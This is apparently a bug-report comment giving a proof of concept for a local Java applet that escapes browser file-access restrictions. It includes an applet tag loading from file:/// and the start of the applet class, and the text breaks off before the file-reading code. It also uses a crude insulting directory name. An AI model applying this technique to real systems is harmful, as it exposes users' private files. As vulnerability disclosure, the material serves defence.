a1.java - compiled a1.class must be saved in
/tmp/DumbUglyB1llMarriedDumbUglyB1tch

recent trunk has restrictions on what local html can access

in bug 402998 Comment #8 someone with sun.com email asked to "post a test" for
local applet circumventing restrictions.

it is like beating a death horse, but here it is:

if the path of the locally saved applet is known at applet compile time, the
applet can read any file.

note that if the luser saves files in a single directory, a two stage attack
may be successful with high probability.

suppose the applet is saved in directory:
/tmp/DumbUglyB1llMarriedDumbUglyB1tch

it should be instantiated like this:
<applet codebase="file:///"
code="tmp.DumbUglyB1llMarriedDumbUglyB1tch.a1">
</applet>

and the applet should contain:
/*
 * This is the path to the applet filename:
 * */
package tmp.DumbUglyB1llMarriedDumbUglyB1tch;
public class a1 extends Applet {
